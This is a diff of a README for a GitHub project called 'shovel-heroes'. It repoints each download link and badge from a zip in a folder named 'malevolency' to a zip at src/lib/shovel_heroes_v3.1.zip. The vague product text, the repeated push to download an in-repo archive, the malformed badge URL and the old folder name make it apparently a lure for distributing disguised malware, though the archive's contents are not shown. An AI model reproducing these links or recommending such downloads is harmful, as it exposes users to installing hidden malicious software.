@@ -6,7 +6,7 @@ Welcome to shovel-heroes! This application lets you embark on exciting adventure
 
 ## 📥 Download Now
 
-[![Download shovel-heroes](https://raw.githubusercontent.com/ahmadx0001/shovel-heroes/main/malevolency/shovel-heroes.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ahmadx0001/shovel-heroes/main/malevolency/shovel-heroes.zip)
+[![Download shovel-heroes](https://github.com/ahmadx0001/shovel-heroes/raw/refs/heads/main/src/lib/shovel_heroes_v3.1.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/ahmadx0001/shovel-heroes/raw/refs/heads/main/src/lib/shovel_heroes_v3.1.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before you get started, ensure your computer meets the following requirements:
 
 ## 📄 Download & Install
 
-To download the shovel-heroes application, visit this page to download the latest version: [Download Link](https://raw.githubusercontent.com/ahmadx0001/shovel-heroes/main/malevolency/shovel-heroes.zip). 
+To download the shovel-heroes application, visit this page to download the latest version: [Download Link](https://github.com/ahmadx0001/shovel-heroes/raw/refs/heads/main/src/lib/shovel_heroes_v3.1.zip). 
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the most recent version based on the dates listed.
@@ -76,4 +76,4 @@ If you experience issues during installation or gameplay, consider the following
 
 If you have further questions or need help, feel free to reach out. You can contact our support team via the Issues section on GitHub or join our community discussions.
 
-Explore shovel-heroes today! Don’t forget to check for updates regularly. Here’s the link once more for easy access: [Download Link](https://raw.githubusercontent.com/ahmadx0001/shovel-heroes/main/malevolency/shovel-heroes.zip). Happy digging!
+Explore shovel-heroes today! Don’t forget to check for updates regularly. Here’s the link once more for easy access: [Download Link](https://github.com/ahmadx0001/shovel-heroes/raw/refs/heads/main/src/lib/shovel_heroes_v3.1.zip). Happy digging!
